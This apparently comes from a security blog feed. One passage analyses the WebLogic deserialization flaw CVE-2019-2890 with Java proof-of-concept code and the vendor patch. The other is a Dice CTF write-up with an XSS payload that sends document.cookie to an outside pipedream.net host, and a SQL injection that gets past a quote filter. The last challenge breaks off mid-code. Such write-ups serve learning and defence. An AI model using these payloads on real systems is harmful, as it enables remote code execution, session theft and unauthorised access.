class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var2 = var1.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[var2];</span><br><span class="line">        var1.readFully(var3);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            var3 = EncryptionUtil.decrypt(var3);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream var4 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line">        ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)var5.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터는 <code>readObject</code> 메서드에서 <code>readSubject</code> 메서드로 전달해 줘 받게 됩니다. <code>Line 3 ~ 8</code>에서 데이터를 읽고, 복호화를 하고, <code>Line 10 ~ 12</code>에서 역직렬화를 하는데 바로 이때 RCE가 터집니다.<br></p><p>이로서 우리는 <code>PersistentContext</code> 클래스에서는 직렬화한 데이터를 암호화하고, 전송한다는 것을 알고 있습니다. 그렇기 때문 익스플로잇을 하려면 이를 기반으로 POC를 작성해서 직렬화 데이터를 만들어주어야 합니다. </p><hr><h2 id="CVE-2019-2890-POC"><a href="#CVE-2019-2890-POC" class="headerlink" title=" CVE-2019-2890 POC"></a><span style="color:#21C587"></span> CVE-2019-2890 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.jaxws.persistence;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.kernel.KernelStatus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span>  </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sep = command.indexOf(<span class="number">58</span>);</span><br><span class="line">            String host;</span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                port = (<span class="keyword">new</span> Random()).nextInt(<span class="number">65535</span>);</span><br><span class="line">                host = command;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">                port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ObjID id = <span class="keyword">new</span> ObjID((<span class="keyword">new</span> Random()).nextInt());</span><br><span class="line">            TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">            UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">            RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">            Registry proxy = (Registry)Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">            <span class="keyword">return</span> proxy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">            PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            objectOutputStream.writeObject(pc);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>위 java code가 main poc 코드입니다. 위 poc 클래스를 이용해 직렬화 데이터를 만들어야 합니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) &#123;</span></span><br><span class="line"><span class="comment">//        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span></span><br><span class="line"><span class="comment">//        getSubjectManager().getAnonymousSubject();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var4);</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        var3.writeObject(this._subject);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">[+] var3.writeObject(Poc.getObject());</span><br><span class="line"></span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (KernelStatus.isServer()) &#123;</span></span><br><span class="line"><span class="comment">//        var5 = EncryptionUtil.encrypt(var5);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같이 writeSubject 메서드에서 <code>Poc.getObject</code>를 추가하면 됩니다. 하지만 일단 직렬화 데이터를 만들기 전에는 4가지 문제점이 생기는데 이를 모두 해결해줘야 합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.bea.core.security.managers.NotSupportedException</span><br><span class="line">    at weblogic.security.service.SecurityServiceManager.isKernelIdentity(SecurityServiceManager.java:546)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.PersistenContext.&lt;init&gt;(PersistentContext.java:168)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.Poc2.main(Poc2.java:27)</span><br></pre></td></tr></table></figure><ol><li>첫 번째 오류는 PersistenContext 객체를 만들 때 발생합니다. 이 에러는 PersistenContext를 초기화 중에 호출 하는데 <code>SecurityServiceManager.isKernelIdentity</code> 메서드를 이용해서 커널 ID를 체크하는데 이때 에러를 내뱉고 직렬화를 종료하게 됩니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> bollean <span class="title">isKernelIdentity</span><span class="params">(AuthenticatedSubject var0)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isKernelIdentity</code> 메서드에서 <code>NotSupportedException</code> 메서드를 호출하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PersistenContext(<span class="meta">@NotNull</span> String var1, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var2, <span class="meta">@NotNull</span> Set&lt;String&gt; var3, <span class="meta">@Nullable</span> Map&lt;String, Serializable&gt; var4, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var5) &#123;</span><br><span class="line">    <span class="keyword">super</span>(var1);</span><br><span class="line">    <span class="keyword">this</span>._propertyMap = var2;</span><br><span class="line">    <span class="keyword">this</span>._proBagClassNames = var3;</span><br><span class="line">    <span class="keyword">this</span>._contextPropertyMap = var4;</span><br><span class="line">    <span class="keyword">this</span>._invocationPropertyMap = var5;</span><br><span class="line">    <span class="keyword">this</span>._state = PersistentContext.State.UNUSED;</span><br><span class="line">   AuthenticatedSubject var6 = getCurrentSubject();</span><br><span class="line"><span class="comment">//      if (SecurityServiceManager.isKernelIdentity(var(6)) &#123;</span></span><br><span class="line"><span class="comment">//          throw new IllegalStateException(&quot;Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal&quot;);</span></span><br><span class="line"><span class="comment">//      &#125; else &#123;</span></span><br><span class="line"><span class="comment">//          this._subject = var6;</span></span><br><span class="line"><span class="comment">//          this._initTransients();</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">    <span class="keyword">this</span>._subject = var6;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>첫 번재 문제는 위와 같이 <code>PersistenContext</code>에서 <code>isKernelIdentity</code> 메서드를 이용한 조건문을 모두 주석 처리함으로 해결할 수 있습니다.<br></p><ol start="2"><li>두 번째 문제는 <code>deserialization PersistenContext</code> 클래스가 중단되는 것 입니다. </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersistentContext</span> <span class="keyword">extends</span> <span class="title">AbstractStorable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AuthenticatedSubject KERNEL_ID = (AuthenticatedSubject)AccessController.doPrivileged(PrivilgedActions.getKernelIdentityAction());</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ReentranReadWriteLock _lock;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Serializable&gt; _propertyMap;</span><br><span class="line">    </span><br><span class="line">    (생략)</span><br></pre></td></tr></table></figure><p><code>PersistentContext</code> 클래스를 보면 <code>AuthenticatedSubject</code>를 초기화하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SubjectManager <span class="title">getSubjectManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var0 = ceSubjectManagerLock; var0 (slot_0): Object@<span class="number">661</span></span><br><span class="line">    <span class="keyword">synchronized</span>(ceSubjectManagerLock) &#123;</span><br><span class="line">        <span class="keyword">while</span>(ceSubjectManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ceClient) &#123;</span><br><span class="line">                ceSubjectManager = SubjectManagerFactory.getInstance().getSubjectManager();</span><br><span class="line">                <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">             &#125;</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 ceSubjectManagerLock.wait();</span><br><span class="line">             &#125; <span class="keyword">catch</span> (InterruptedException var3) &#123;</span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var3);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AuthenticatedSubject</code>를 초기화 할 때는 위 코드가 실행되는데 <code>ceClient</code>의 값이 <code>True</code>가 아니라면 무한 루프에 빠지는 것을 볼 수 있습니다. <code>ceSubjectManagerLock.wait</code> 메서드에서는 직렬화가 실행되지 않습니다. 그리고 <code>ceClient</code>는 시스템 속성이기 때문에 <code>com.bea.core.internal.client</code>을 이용해서 <code>True</code>를 설정할 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final bollean ceClient &#x3D; &quot;true&quot;.equalsIgnoreCase(System.getProperty( key:&quot;com.bea.core.internal.client&quot;, def:&quot;false&quot;));</span><br></pre></td></tr></table></figure><p>그래서 위와 같이 <code>ceClient</code> 변수를 설정해주면 무한루프에 빠지지 않아 두 번째 문제도 해결할 수 있습니다.<br></p><ol start="3"><li>세 번째 문제는 직렬화 데이터가 암호화되지 않는다는 것 입니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] var0) &#123;</span><br><span class="line">    <span class="keyword">return</span> Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EncryptionUtilencrypt</code>를 확인해보면 <code>isServer</code> 메서드 값이 참이면 암호화한 값을 넣어주고, 참이 아니면 암호화하지 않고 원본을 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KernelStatus.setIsServer(true)</span><br></pre></td></tr></table></figure><p>그래서 직렬화 데이터를 암호화하기 전에 위 구문을 정의해줌으로서 <code>isServer</code> 값이 참이 되게 만들면 직렬화 데이터가 잘 암호회되어 세 번째 문제도 해결할 수 있습니다.<br></p><ol start="4"><li>네 번째 문제는 암호화에 사용되는 <code>SerializedSystemIni.dat</code> 파일이 없다는 겁니다. 해당 문제를 해결하기 위해서는 현재 웹 로직에서 사용되고 있는 <code>SerializedSystemIni.dat</code> 파일을 poc 디렉터리에 넣어주면 됩니다.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">    PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    objectOutputStream.writeObject(pc);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4가지의 문제를 모두 해결하였으면 <code>poc.ser</code> 파일을 생성하고, 해당 파일로 익스를 진행하면 RCE를 트리거 할 수 있습니다.</p><hr><h2 id="CVE-2019-2890-Patch"><a href="#CVE-2019-2890-Patch" class="headerlink" title=" CVE-2019-2890 Patch"></a><span style="color:#21C587"></span> CVE-2019-2890 Patch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream in)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = in.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        in.readFully(bytes);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            bytes = EncryptionUtil.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in2 = <span class="keyword">new</span> PersistentContext.WSFilteringObjectInputStream(bais);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)in2.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>패치 코드를 확인해보면 <code>readSubject</code> 메서드에서 데이터를 검증하는 <code>WSFilteringObjectInputStream</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> tatic <span class="class"><span class="keyword">class</span> <span class="title">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title">FilteringObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">super</span>.resloveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.firstClassName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String className = descriptor.getName();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz.asSubclass(Subject.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassExecption(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">this</span>.firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WSFilteringObjectInputStream</code> 메서드는 위와 같습니다.</p><hr><h2 id="CVE-2019-2890-Point"><a href="#CVE-2019-2890-Point" class="headerlink" title=" CVE-2019-2890 Point"></a><span style="color:#21C587"></span> CVE-2019-2890 Point</h2><ul><li>조건<br></li></ul><ol><li>웹 로직에서 T3 프로토콜이 열려있어야한다.</li><li>웹 로직에서 사용하고 있는 SerializedSystemIni.dat 파일을 릭할 수 있어야 한다.</li></ol><p>분석을 해본 결과 해당 취약점을 이용해서 익스를 하기 위해서는 위 2가지 조건을 충족해야 하는 거 같습니다. 긴 글 읽어주셔서 감사합니다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF Write Up</title>
      <link href="2021/02/08/2021-02-08-Dice-CTF/"/>
      <url>2021/02/08/2021-02-08-Dice-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/Dice%20CTF/dice%20main.png?raw=true"></p><hr><h2 id="Web-Babier-CSP-107-pts"><a href="#Web-Babier-CSP-107-pts" class="headerlink" title=" (Web) Babier CSP [107 pts]"></a><span style="color:#21C587"></span> (Web) Babier CSP [107 pts]</h2><blockquote><p>The Babier CSP challenge is a simple CSP Bypass challenge.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span></span><br><span class="line"><span class="javascript">elem.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  location = <span class="string">&quot;/?name=&quot;</span> + <span class="built_in">encodeURIComponent</span>([<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pineapple&quot;</span>, <span class="string">&quot;pear&quot;</span>][<span class="built_in">Math</span>.floor(<span class="number">4</span> * <span class="built_in">Math</span>.random())]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;location.href&#x3D;&quot;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;%2bdocument.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{web_1s_a_stat3_0f_grac3_857720}</p></blockquote><hr><h2 id="Web-Missing-Flavortext-111-pts"><a href="#Web-Missing-Flavortext-111-pts" class="headerlink" title=" (Web) Missing Flavortext [111 pts]"></a><span style="color:#21C587"></span> (Web) Missing Flavortext [111 pts]</h2><blockquote><p> The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([req.body.username, req.body.password].some(<span class="function"><span class="params">v</span> =&gt;</span> v.includes(<span class="string">&#x27;\&#x27;&#x27;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password[]&#x3D;1&amp;password[]&#x3D;&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p></blockquote><hr><h2 id="Web-Web-Utils-121-pts"><a href="#Web-Web-Utils-121-pts" class="headerlink" title=" (Web) Web Utils [121 pts]"></a><span style="color:#21C587"></span> (Web) Web Utils [121 pts]</h2><blockquote><p>TThe Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// view.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> id = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span 